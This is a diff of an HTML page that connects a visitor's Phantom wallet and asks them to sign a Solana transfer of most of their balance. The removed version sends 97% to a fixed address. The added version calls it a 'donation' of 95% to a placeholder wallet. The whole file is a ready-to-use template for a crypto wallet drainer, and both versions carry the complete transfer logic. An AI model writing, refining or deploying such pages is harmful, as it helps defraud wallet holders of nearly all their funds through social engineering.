@@ -3,72 +3,126 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Send SOL to A647hLQ8eZe3qLHzgxGjp1qC9ydL1xVTh7uV2bigsA26</title>
-  <!-- Load Solana Web3.js from CDN -->
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.34.0/dist/web3.min.js"></script>
+  <title>Donate to My SOL Wallet</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      text-align: center;
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    button {
+      padding: 10px 20px;
+      margin: 10px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    h1 {
+      font-size: 24px;
+    }
+    p {
+      font-size: 18px;
+    }
+  </style>
 </head>
 <body>
-  <button id="connectButton">Connect Wallet</button>
-  <button id="sendButton" style="display:none;">Send 97% SOL to A647hLQ8eZe3qLHzgxGjp1qC9ydL1xVTh7uV2bigsA26</button>
 
+  <div class="container">
+    <h1>Donate 95% of Your SOL to My Wallet</h1>
+    <button id="connect-wallet">Connect Phantom Wallet</button>
+    <p id="wallet-address"></p>
+    <button id="donate-button" style="display: none;">Donate 95% SOL</button>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.25.0/lib/index.iife.js"></script>
   <script>
-    const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3; // Now using the correct solanaWeb3 reference
-    
-    // Phantom wallet connection
-    const connectButton = document.getElementById('connectButton');
-    const sendButton = document.getElementById('sendButton');
+    let walletAddress = null;
 
-    // Connect wallet when user clicks on the connect button
-    connectButton.onclick = async () => {
-      if (window.solana && window.solana.isPhantom) {
+    // Connect Phantom Wallet
+    const connectButton = document.getElementById('connect-wallet');
+    const donateButton = document.getElementById('donate-button');
+    const walletAddressText = document.getElementById('wallet-address');
+
+    if (window.solana && window.solana.isPhantom) {
+      connectButton.addEventListener('click', async () => {
         try {
-          // Request wallet connection
           await window.solana.connect();
-          console.log('Wallet connected:', window.solana.publicKey.toString());
+          walletAddress = window.solana.publicKey.toString();
+          walletAddressText.textContent = `Connected: ${walletAddress}`;
           connectButton.style.display = 'none';
-          sendButton.style.display = 'block';
+          donateButton.style.display = 'inline-block';
         } catch (err) {
-          console.error('Failed to connect wallet:', err);
+          console.error('Connection failed', err);
+          alert('Failed to connect Phantom Wallet');
         }
-      } else {
-        alert('Please install Phantom Wallet');
-      }
+      });
+    } else {
+      alert('Please install Phantom wallet');
+    }
+
+    // Get the balance of the wallet
+    const getBalance = async () => {
+      const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+      const publicKey = new solanaWeb3.PublicKey(walletAddress);
+      const balance = await connection.getBalance(publicKey);
+      return balance / 1000000000; // Convert lamports to SOL
     };
 
-    // Send SOL when the user clicks the send button
-    sendButton.onclick = async () => {
-      const publicKey = window.solana.publicKey;
-      const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
-      const recipient = new PublicKey('A647hLQ8eZe3qLHzgxGjp1qC9ydL1xVTh7uV2bigsA26');
-
+    // Send 95% of the SOL balance
+    const sendSOL = async (amount) => {
       try {
-        // Get the wallet balance (in lamports, which is 1 SOL = 1e9 lamports)
-        const balance = await connection.getBalance(publicKey);
-        const amountToSendLamports = (balance * 0.97); // 97% of the balance
-        console.log(`Sending ${amountToSendLamports / 1e9} SOL to ${recipient.toString()}`);
+        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+        const fromPublicKey = new solanaWeb3.PublicKey(walletAddress);
+        const toPublicKey = new solanaWeb3.PublicKey('YourWalletAddressHere'); // Replace with your SOL wallet address
 
-        // Create transaction to transfer SOL
-        const transaction = new Transaction().add(
-          SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: recipient,
-            lamports: amountToSendLamports
+        const transaction = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: fromPublicKey,
+            toPubkey: toPublicKey,
+            lamports: amount * 1000000000, // Convert SOL to lamports
           })
         );
 
-        // Sign the transaction using Phantom
-        const signedTransaction = await window.solana.signTransaction(transaction);
-        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-
-        // Confirm the transaction
-        await connection.confirmTransaction(signature);
-        console.log('Transaction successful:', signature);
+        const { signature } = await window.solana.signAndSendTransaction(transaction);
+        console.log('Transaction signature:', signature);
+        alert('Donation successful!');
       } catch (err) {
-        console.error('Error sending SOL:', err);
+        console.error('Transaction failed', err);
+        alert('Donation failed');
       }
     };
+
+    // Donate 95% of the wallet balance
+    donateButton.addEventListener('click', async () => {
+      if (walletAddress) {
+        const userBalance = await getBalance();
+        const donationAmount = userBalance * 0.95;
+        await sendSOL(donationAmount);
+      } else {
+        alert('Please connect your wallet first');
+      }
+    });
   </script>
 </body>
 </html>
+
 
 
